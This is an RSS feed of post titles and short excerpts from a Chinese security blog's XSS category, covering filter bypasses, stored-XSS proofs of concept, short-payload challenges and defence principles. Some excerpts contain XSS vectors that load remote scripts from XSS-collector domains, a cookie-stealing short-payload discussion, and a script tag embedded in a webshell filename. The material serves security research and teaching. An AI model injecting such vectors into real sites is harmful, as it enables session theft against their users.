<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>XSS on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
    <link>https://lcx.cc/categories/xss/</link>
    <description>Recent content in XSS on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
    <lastBuildDate>Mon, 31 Aug 2015 15:42:37 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/xss/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS</title>
      <link>https://lcx.cc/post/4564/</link>
      <pubDate>Mon, 31 Aug 2015 15:42:37 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4564/</guid>
      <description>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS 小饼仔 | 2015-08-20 14:52 看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器ca</description>
    </item>
    
    <item>
      <title>Bypassing Chrome’s Anti-XSS Filter，绕过谷歌浏览器 XSS 过滤器</title>
      <link>https://lcx.cc/post/4546/</link>
      <pubDate>Thu, 25 Jun 2015 16:45:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4546/</guid>
      <description>Hi! Just wanted to share my finding. I’ve found a way to bypass Chrome’s anti-xss filter. This bypass is universal, and it defeats Chrome’s XSSAuditor in all cases! Description XSS attacks occur when one website injects JavaScript code into otherwise legitimate requests to another website. The injected script generally attempts to access privileged</description>
    </item>
    
    <item>
      <title>Wordpress &lt; 4.1.2 存储型XSS分析与稳定POC</title>
      <link>https://lcx.cc/post/4525/</link>
      <pubDate>Fri, 01 May 2015 10:44:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4525/</guid>
      <description>作者: phithon 分类: web前端 时间: 2015-4-27 22:59 标签: 富文本 xss Wordpress这个XSS实际上是很好用的，匿名用户即可发表并触发，这里给出简单的分析与稳</description>
    </item>
    
    <item>
      <title>python富文本XSS过滤器开发与研究</title>
      <link>https://lcx.cc/post/4516/</link>
      <pubDate>Thu, 09 Apr 2015 09:23:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4516/</guid>
      <description>python富文本XSS过滤器 phith0n (我也不会难过 你不要小看我) | 2015-04-08 22:23 前言：那天我正在开发网站最关键的部分——XSS过滤器，女神突然来电话说：“</description>
    </item>
    
    <item>
      <title>一些有趣的 XSS Vector</title>
      <link>https://lcx.cc/post/4427/</link>
      <pubDate>Thu, 11 Sep 2014 09:53:11 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4427/</guid>
      <description>XSS Vector #1 &amp;lt;script src=https://lcx.cc/?20.rs&amp;gt;&amp;lt;/script&amp;gt; URL中第二个斜杠在Internet Explorer下（测试于IE11）可被U+3031,U+3033,U+3035,U+309D</description>
    </item>
    
    <item>
      <title>短域名进化史，XSS，短网址，长度限制绕过，教你注册超短域名</title>
      <link>https://lcx.cc/post/4416/</link>
      <pubDate>Mon, 18 Aug 2014 09:38:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4416/</guid>
      <description>一个短的域名一直都是很多人所推崇的。因为对于大部分人来说，域名越短就会越好记忆。但是，还存在一部分人，他们不在乎域名是否好记，但是他们巴不得</description>
    </item>
    
    <item>
      <title>无声杯 xss 挑战赛 writeup</title>
      <link>https://lcx.cc/post/4407/</link>
      <pubDate>Sun, 27 Jul 2014 10:11:36 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4407/</guid>
      <description>本次比赛参与人数3700多人，提交并获得了分数的正确答案共有1069条。最终有65名参赛者获得了奖品，一、二、三名分别由p.z，piaca和</description>
    </item>
    
    <item>
      <title>基于referrer的XSS的利用 第二部分</title>
      <link>https://lcx.cc/post/4384/</link>
      <pubDate>Tue, 01 Jul 2014 10:11:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4384/</guid>
      <description>from：http://masatokinugawa.l0.cm/2014/06/referrer-xss-part2.html 在开始第二部</description>
    </item>
    
    <item>
      <title>CVE-2014-0509 使用⾼半代理(0xD800~0xDBFF)的 Flash XSS</title>
      <link>https://lcx.cc/post/4354/</link>
      <pubDate>Sat, 31 May 2014 10:34:46 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4354/</guid>
      <description>原文链接：http://masatokinugawa.l0.cm/2014/05/flash-highsurrogate-xss.html F</description>
    </item>
    
    <item>
      <title>XSS Filter Evasion Cheat Sheet 中文版</title>
      <link>https://lcx.cc/post/4328/</link>
      <pubDate>Sat, 17 May 2014 09:28:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4328/</guid>
      <description>前言 译者注： 翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常有价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅</description>
    </item>
    
    <item>
      <title>SOHU视频XSS漏洞导致其用户成为DDOS肉鸡，22000用户发了2000万GET请求</title>
      <link>https://lcx.cc/post/4306/</link>
      <pubDate>Wed, 30 Apr 2014 15:01:24 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4306/</guid>
      <description>from: One of World’s Largest Websites Hacked: Turns Visitors into “DDoS Zombies” incapsula发现其一个客户遭受了应用层的DDos攻击。 大概有22000的互联</description>
    </item>
    
    <item>
      <title>header头referer字段反射xss利用</title>
      <link>https://lcx.cc/post/4301/</link>
      <pubDate>Mon, 28 Apr 2014 10:53:49 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4301/</guid>
      <description>header头referer字段反射xss利用 ##伪造referer 自从flash修复伪造referer之后，目前没有已知的伪造refere</description>
    </item>
    
    <item>
      <title>一种很鸡肋的XSS，我喜欢叫它【No refresh Xss】，自爆菊花型</title>
      <link>https://lcx.cc/post/4218/</link>
      <pubDate>Thu, 20 Feb 2014 09:18:07 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4218/</guid>
      <description>一种很鸡肋的XSS，我喜欢叫它【No refresh Xss】 Finger (Save water. Shower with your girlfriend.) | 2014-02-19 12:48 可能有的小伙伴们遇到过这样一种xss 比如留言版，我们在插入xss测试代码提</description>
    </item>
    
    <item>
      <title>过滤了符号 \ 和 / 该如何绕过进行 XSS 攻击?</title>
      <link>https://lcx.cc/post/4192/</link>
      <pubDate>Mon, 27 Jan 2014 09:32:26 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4192/</guid>
      <description>过滤了符号 \ 和 / 该如何绕过进行 XSS 攻击? 超威蓝猫 (‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮‮) | 2014-01-25 15:43 传入 &amp;lt;script src=&#34;//xss.tw/4091&#34;&amp;gt;&amp;lt;/script&amp;gt; 输出 &amp;lt;script src=&#34;xss.tw4091&#34;&amp;gt;&amp;lt;script&amp;gt; 求大牛支招。 [原文</description>
    </item>
    
    <item>
      <title>xss玩转第三方微信公众平台的姿势！</title>
      <link>https://lcx.cc/post/4182/</link>
      <pubDate>Tue, 21 Jan 2014 09:44:23 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4182/</guid>
      <description>xss玩转第三方微信公众平台的姿势！ 苦战 | 2014-01-20 09:47 昨晚躺床上突然想到的 既然有基友玩微信注入，那是不是微信也能玩XSS，就有了这个姿势~ 首先见框就</description>
    </item>
    
    <item>
      <title>Bypass xss过滤的测试方法</title>
      <link>https://lcx.cc/post/4172/</link>
      <pubDate>Wed, 15 Jan 2014 10:45:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4172/</guid>
      <description>0x00 背景 本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方</description>
    </item>
    
    <item>
      <title>当self-xss遇到clickjacking</title>
      <link>https://lcx.cc/post/4168/</link>
      <pubDate>Tue, 14 Jan 2014 09:03:55 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4168/</guid>
      <description>当self-xss遇到clickjacking D＆G | 2014-01-13 10:35 self-xss一般是认为没有危害的。比如http://kuai.xunlei.c</description>
    </item>
    
    <item>
      <title>[抛砖引玉]无处不在的输入点，各种 XSS 奇技淫巧</title>
      <link>https://lcx.cc/post/4161/</link>
      <pubDate>Thu, 09 Jan 2014 15:01:53 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4161/</guid>
      <description>这不是一篇介绍介绍技术的文章，只是一种开放思维的尝试。主要着重于当遇到输入过滤的情况下，如何找到可以利用的输入点。 本质上来说如果要进行xss</description>
    </item>
    
    <item>
      <title>【讨论】字符串长度限制31字节，31字符xss挑战</title>
      <link>https://lcx.cc/post/4057/</link>
      <pubDate>Sat, 30 Nov 2013 09:14:45 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4057/</guid>
      <description>31字符xss挑战 vakin | 2013-11-21 12:13 要求能或得cookie，cookie啊。 &amp;lt;script src=http://&amp;gt;&amp;lt;/script&amp;gt; 都去了29个了。 [原文地址] 相关讨论： 1# 木易耳朵 | 2013-11-21 12:17 &amp;lt;script/src=//&amp;gt;&amp;lt;/script&amp;gt; 2# Noxxx | 2013-11-21 12:23 &amp;lt;script src=http:t.cn/8aaaaa0&amp;gt;</description>
    </item>
    
    <item>
      <title>[XSS神器]XssEncode chrome插件</title>
      <link>https://lcx.cc/post/4045/</link>
      <pubDate>Sun, 24 Nov 2013 14:54:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4045/</guid>
      <description>0x00 闲扯 好吧继上一篇文章之后，就没发文章了！(其实是一直在写但是写的很少还凑不起一篇文章而已) 但是这几天对插件进行了一定的改良了 因为在自己在实</description>
    </item>
    
    <item>
      <title>XSS安全公司风险警报 各个公司收报警的方式应该都是邮件或者在网页里查看</title>
      <link>https://lcx.cc/post/4015/</link>
      <pubDate>Tue, 19 Nov 2013 14:40:51 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4015/</guid>
      <description>各个公司收报警的方式应该都是邮件或者在网页里查看 xsjswt | 2013-11-19 14:04 如果把webshell的名字改成 &#39;&amp;gt;&#34;&amp;gt;&amp;lt;script src=xxxxxx&amp;gt;&amp;lt;/script&amp;gt;.php 会不会很猥琐 [原文地址] 相关讨论： 1# xsser (十根阳具</description>
    </item>
    
    <item>
      <title>微信一个公众账号的XSS</title>
      <link>https://lcx.cc/post/4010/</link>
      <pubDate>Fri, 15 Nov 2013 15:26:21 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4010/</guid>
      <description>今天打开朋友圈，发现一好玩的东西。 点进去发现是这个，随便填了几个人名。。 发现被坑了。。 果断关注这个公众账号。。好像很牛逼的样子。。 原来是可以</description>
    </item>
    
    <item>
      <title>科普：请问什么叫xss盲打？</title>
      <link>https://lcx.cc/post/3981/</link>
      <pubDate>Mon, 04 Nov 2013 10:35:16 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3981/</guid>
      <description>请问什么叫xss盲打？ khjian | 2013-11-02 13:27 xss小白，老听人讲xss盲打，是什么意思啊？大牛给科普一下呗，谢谢了 [原文地址] 相关内容： 1# 小胖子 (我承认，</description>
    </item>
    
    <item>
      <title>关于转载问题思考，转载后在特定站点会不会导致触发xss漏洞？</title>
      <link>https://lcx.cc/post/3977/</link>
      <pubDate>Sat, 02 Nov 2013 09:41:43 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3977/</guid>
      <description>关于转载问题思考 he1renyagao (&amp;lt;script src=http://xsserme.sinaapp.com/03h4FW?1383289085&amp;gt;&amp;lt;/script&amp;gt;) | 2013-11-01 14:39 rt 如果在zone的一个话题，评论中插入一个xss，虽然在zone中不会被触发，但如果被某些XX转载之后，会不会在</description>
    </item>
    
    <item>
      <title>XSS与字符编码的那些事儿 ---科普文</title>
      <link>https://lcx.cc/post/3964/</link>
      <pubDate>Wed, 23 Oct 2013 10:27:53 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3964/</guid>
      <description>目录 0x00:基本介绍 0x01:html实体编码 0x02:新增的实体编码 实体编码变异以及浏览器的某些工作原理！ 0x03:javascript</description>
    </item>
    
    <item>
      <title>把储存型XSS变成反射型XSS 突破长度限制</title>
      <link>https://lcx.cc/post/3915/</link>
      <pubDate>Sat, 28 Sep 2013 10:11:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3915/</guid>
      <description>把储存型XSS变成反射型XSS 突破长度限制 LaiX ([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+) | 2013-09-17 19:08 如果我们遇到了有长度限制怎么办？难道就真的无法利用然后放弃吗？其实我们可以将有限空间发挥</description>
    </item>
    
    <item>
      <title>Short XSS</title>
      <link>https://lcx.cc/post/3886/</link>
      <pubDate>Tue, 17 Sep 2013 17:09:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3886/</guid>
      <description>0x00 背景 关键时候长度不够怎么办？ 在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，</description>
    </item>
    
    <item>
      <title>猥琐思路XSS</title>
      <link>https://lcx.cc/post/3801/</link>
      <pubDate>Fri, 09 Aug 2013 09:01:03 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3801/</guid>
      <description>刚刚把域名解析到了点点博客 发现域名管理后台没有限制脚本 于是猥琐的修改并X了注册人信息 然后QQ去喊客服MM 去修改指向地址，于是客服MM中枪..</description>
    </item>
    
    <item>
      <title>发两个qq钓鱼站点 求测试 - 乌云白帽子 XSS 实例</title>
      <link>https://lcx.cc/post/3752/</link>
      <pubDate>Mon, 22 Jul 2013 15:48:50 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3752/</guid>
      <description>发两个qq钓鱼站点 求测试 白熊一枚 | 2013-07-21 23:18 第一个： 先给地址为敬： kkk.sinotide.com.cn/www/1071vfghy-kmlo 第一个站点目测是个独服，ip为173.252.247.162，绑了大量的域名。</description>
    </item>
    
    <item>
      <title>腾讯微信奇葩漏洞，劫持朋友圈好友打开指定网站，或许还可以XSS、钓鱼哟</title>
      <link>https://lcx.cc/post/3739/</link>
      <pubDate>Fri, 19 Jul 2013 14:29:08 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3739/</guid>
      <description>中午的时候，有一朋友发消息过来，说是在朋友圈点击我名字，会跳出一个名为“诺基亚生活”的奇怪网页，而点击其他人正常，只有我这样…… 本人表示相当</description>
    </item>
    
    <item>
      <title>Bypass IE XSS Filter</title>
      <link>https://lcx.cc/post/3690/</link>
      <pubDate>Thu, 11 Jul 2013 09:02:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3690/</guid>
      <description>0x00 背景 从IE8 beta2 开始，微软加入了xss Filter。如同大部分安全产品一样，防护的对策就是利用规则去过滤攻击代码，基于可用和效率的考虑，同时</description>
    </item>
    
    <item>
      <title>JSONObject输出json串可引发XSS</title>
      <link>https://lcx.cc/post/3663/</link>
      <pubDate>Mon, 08 Jul 2013 10:59:21 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3663/</guid>
      <description>测试用的是net.sf.json.JSONObject，大家也可以去试试其他JSONObject。 JSONObject json = null; json = new JSONObject(); json.put(&#34;code&#34;, 200); json.put(&#34;info&#34;, &#34;tester&#34;); json.put(&#34;msg&#34;, &#34;success&#34;); System.out.println(json); // 输出：{&#34;</description>
    </item>
    
    <item>
      <title>利用Chrome插件向指定页面植入js，劫持 XSS，一些猥琐的想法与实践</title>
      <link>https://lcx.cc/post/3653/</link>
      <pubDate>Sat, 06 Jul 2013 15:58:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3653/</guid>
      <description>0x00 Chrome插件 -------------------------- 这个想法是昨天看到@紫梦芊 的帖子想起来的。 想法如下： Chrome插件是可以通过manifest.json的控制，向指定页</description>
    </item>
    
    <item>
      <title>XSS解决方案系列之一：淘宝、百度、腾讯的解决方案之瑕疵</title>
      <link>https://lcx.cc/post/3611/</link>
      <pubDate>Thu, 20 Jun 2013 18:10:47 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3611/</guid>
      <description>【声明】 1. 只是技术研究，没有攻击哪家公司之意 2. 本文不涉及漏洞公布，不影响以上公司的任何应用安全之相关事宜 3. 本人没兴趣炒作，举这三大公司为例表</description>
    </item>
    
    <item>
      <title>防御XSS的七条原则</title>
      <link>https://lcx.cc/post/3610/</link>
      <pubDate>Thu, 20 Jun 2013 18:00:21 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3610/</guid>
      <description>前言 本文将会着重介绍防御XSS攻击的一些原则，需要读者对于XSS有所了解，至少知道XSS漏洞的基本原理，如果您对此不是特别清楚，请参考这两篇</description>
    </item>
    
    <item>
      <title>XSS解决方案系列之二：知其所以然—浏览器是如是解码的</title>
      <link>https://lcx.cc/post/3608/</link>
      <pubDate>Thu, 20 Jun 2013 17:42:45 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3608/</guid>
      <description>说明： 1. 本ID所有文章皆为原创，写文章时没有参考任何文档，推荐参考的link是网络搜索的，不涉及版权。 2. 此文是纯技术文章，如果不幸遇冷，本I</description>
    </item>
    
    <item>
      <title>XSS解决方案系列之三: 例解过后，再回首您正在维护的产品</title>
      <link>https://lcx.cc/post/3607/</link>
      <pubDate>Thu, 20 Jun 2013 17:22:08 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3607/</guid>
      <description>【说明】 1. 举例子所占篇幅较大，详细的例子只举一个吧，目前只举较典型的二维编码的例子 2. 如果您想运行此例，那么你需要自己实现例子当中的类似于ur</description>
    </item>
    
    <item>
      <title>7500刀的accounts.google.com域下XSS分析</title>
      <link>https://lcx.cc/post/3599/</link>
      <pubDate>Thu, 20 Jun 2013 14:45:34 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3599/</guid>
      <description>GOOGLE现在XSS已经涨到3100～7500了，然后某著名日本猥琐流就发了一个accounts.google.com域下的XSS，在微博</description>
    </item>
    
    <item>
      <title>XSS解决方案系列之四：关于编码</title>
      <link>https://lcx.cc/post/3585/</link>
      <pubDate>Wed, 19 Jun 2013 09:25:58 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3585/</guid>
      <description>本文准备说明以下几个问题： 1. 关于重复编码的问题 2. 关于编码的多种形式的问题 3. 关于编码的几个常见问题 【说明】 本文所述编码是指encode，可以理</description>
    </item>
    
    <item>
      <title>一次 SWF XSS 挖掘和利用</title>
      <link>https://lcx.cc/post/3538/</link>
      <pubDate>Tue, 28 May 2013 14:51:07 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3538/</guid>
      <description>[ 目录 ] [0x00] 背景 [0x01] 挖掘漏洞 [0x02] 优雅利用 [0x03] 从反射到rootkit [0x04] 总结 [0x00] 背景 这篇迟到了近一年的paper是对 WooYun: Gmail某处XSS可导致账号持久劫</description>
    </item>
    
    <item>
      <title>Google某处XSS“漏洞”挑战，看谁先弹出cookie！！【娱乐贴】</title>
      <link>https://lcx.cc/post/3494/</link>
      <pubDate>Tue, 14 May 2013 08:45:42 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3494/</guid>
      <description>Google某处XSS“漏洞”挑战，看谁先弹出cookie！！ 疯狗 (谁淫荡啊谁淫荡) | 2013-05-13 16:23 啥也不说了，因为厂商联系不上，放zone里咱们自己</description>
    </item>
    
    <item>
      <title>高级钓鱼攻击来了：针对拍拍的XSS攻击</title>
      <link>https://lcx.cc/post/3477/</link>
      <pubDate>Thu, 09 May 2013 10:12:22 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3477/</guid>
      <description>昨晚我们团队捕获到一起高级钓鱼攻击，紧急响应后，对背后的团队技术运作能力表示欣赏：终于不是老套的、土得要死的方式。这次还真唤起我心中的那个魔</description>
    </item>
    
    <item>
      <title>Xiuno BBS XSS Vulnerability 简单的xss白盒分析</title>
      <link>https://lcx.cc/post/3444/</link>
      <pubDate>Thu, 25 Apr 2013 13:51:13 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3444/</guid>
      <description>前言 刷微博的时候看到到seay发个了霸气外泄的cms,官方介绍 Xiuno 这个名字来源于圣斗士星矢白羊座的黄金圣斗士修罗，他的攻击速度和战斗力是十二宫</description>
    </item>
    
    <item>
      <title>【讨论帖】XSS，过滤/和空格还有其他办法吗？</title>
      <link>https://lcx.cc/post/3425/</link>
      <pubDate>Wed, 17 Apr 2013 08:56:09 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3425/</guid>
      <description>过滤/和空格还有其他办法吗 xcloud | 2013-04-16 15:36 各位基友有什么办法,xss新手求带 1# 齐迹 | 2013-04-16 16:28 / 是硬伤。。。 2# 0x0F (??) | 2013-04-16 16:58 &amp;lt;script&amp;gt;alert(2) 3# xcloud | 2013-04-16 17:32 @0x0F 连script 和()</description>
    </item>
    
    <item>
      <title>【跟风贴】XSS挖出一个黑产团体</title>
      <link>https://lcx.cc/post/3394/</link>
      <pubDate>Tue, 26 Mar 2013 16:08:08 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3394/</guid>
      <description>看了 @erevus 的帖子心血来潮，专门在网上找了几个发布中奖信息的网站 其中有个http://hnws76.com。 刚访问时，Chrome已出现安全提示，</description>
    </item>
    
    <item>
      <title>XSS挖出一个黑产团体</title>
      <link>https://lcx.cc/post/3387/</link>
      <pubDate>Sun, 24 Mar 2013 14:44:44 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3387/</guid>
      <description>2013-3-25 9:38:28 补充： “XSS挖出一个黑产团体”后续 erevus | 2013-03-25 09:17 关于这个站 我让JC朋友备案了 有拿下该站的哥们请马上去清除下脚印，别躺枪了（我发这帖子后，邮箱</description>
    </item>
    
    <item>
      <title>百度经验的一个储存型XSS漏洞</title>
      <link>https://lcx.cc/post/3386/</link>
      <pubDate>Sun, 24 Mar 2013 14:07:40 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3386/</guid>
      <description>准确的说，这个漏洞是捡到的。 起先是乌云有人发了个帖子： 百度的一个XSS，被删除后，可惜快照还在 梦想肥羊 (www.yangknow.com) | 2013-03-24 13:52 快照一样弹弹框 http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed4fece763104e8c3a4c1fd33f2bd7a7452c8fc50f84642c101a39fee867644b558d92616603a84908eda33522300324b691c38d1edcb8c6222b8b2623706bdc074d8d0dea960673ce6ad11bfeaf68f0caf725e0dac5d2af4323be44717a&amp;amp;p=9a7ae715d9c340ab09b6ca2d0215d377&amp;amp;newp=cb79dd1b86cc41ae5cafc7710e1297305c5bc4387ebad11f7b96&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=XSS+%B5%AF%BF%F2&amp;amp;qid=&amp;amp;p1=1 根据百度快照内</description>
    </item>
    
    <item>
      <title>基于 DOM 的第三类跨站脚本 XSS</title>
      <link>https://lcx.cc/post/3334/</link>
      <pubDate>Wed, 20 Feb 2013 10:53:44 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3334/</guid>
      <description>英文原文：DOM Based Cross Site Scripting or XSS of the Third Kind 翻译原文：http://www.oschina.net/translate/dom-based-xss-</description>
    </item>
    
    <item>
      <title>[译].Net的XSS——绕过.net的请求验证机制</title>
      <link>https://lcx.cc/post/3312/</link>
      <pubDate>Fri, 01 Feb 2013 05:14:19 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3312/</guid>
      <description>原文:http://www.quotium.com/research/advisories/XSS-NetRequestValidation</description>
    </item>
    
    <item>
      <title>j2ee应用异常信息处理不当，可能导致的安全问题：敏感信息泄露及XSS!</title>
      <link>https://lcx.cc/post/3297/</link>
      <pubDate>Tue, 22 Jan 2013 17:25:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3297/</guid>
      <description>//这个以前在空间里有简要说明过这个常见的小问题，也把它搬到乌云来放在一起，以后好找点！ Java异常处理机制（Exception）简要说明：</description>
    </item>
    
  </channel>
</rss>
